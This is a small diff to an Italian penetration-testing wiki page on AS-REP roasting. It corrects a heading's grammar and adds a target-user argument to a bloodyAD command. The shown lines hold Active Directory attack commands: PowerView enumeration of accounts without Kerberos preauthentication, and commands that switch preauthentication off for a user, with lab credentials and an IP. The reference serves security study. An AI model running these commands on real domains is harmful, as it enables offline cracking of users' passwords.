@@ -12,7 +12,7 @@ I principali requisiti per questo attacco sono:
 - **Connessione al Domain Controller (DC)**: Gli attaccanti hanno bisogno di accesso al DC per inviare richieste e ricevere messaggi crittografati.
 - **Account di dominio opzionale**: Avere un account di dominio consente agli attaccanti di identificare più efficientemente gli utenti vulnerabili tramite query LDAP. Senza un tale account, gli attaccanti devono indovinare i nomi utente.
 
-#### Enumerare gli utenti vulnerabili (necessita credenziali di dominio)
+#### Enumerare gli utenti vulnerabili (necessitano credenziali di dominio)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -48,7 +48,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```
 
 ```bash:Using Linux
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
 ## ASREProast senza credenziali
 
